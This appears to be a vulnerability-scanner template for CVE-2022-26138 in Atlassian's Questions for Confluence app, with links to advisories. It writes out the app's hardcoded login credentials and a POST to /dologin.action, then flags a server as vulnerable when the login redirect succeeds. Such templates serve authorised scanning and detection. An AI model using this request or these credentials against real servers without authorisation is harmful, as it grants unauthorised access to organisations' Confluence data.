name: yaml-poc-atlassian-questions_for_confluence-other-CVE-2022-26138
binding: 8cbb3704-d1b6-46ce-a5dd-6e77b3c77ff1
detail:
    author: system_user
    links:
        - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-07-20-1142446709.html
        - https://cxsecurity.com/cveshow/CVE-2022-26138/
        - https://jira.atlassian.com/browse/CONFSERVER-79483
        - https://www.cybersecurity-help.cz/vdb/SB2022072509
    vulnerability:
        id: 823063b6-e593-411d-88f8-1eff68431639
        level: critical
transport: http
set:
    rand: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /dologin.action
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2F{{rand}}.action
        expression: |
            response.status == 302 && ("^" + request.url.scheme + "://" + request.url.host + "/" + rand + ".action$").matches(response.headers["Location"])
expression: r0()
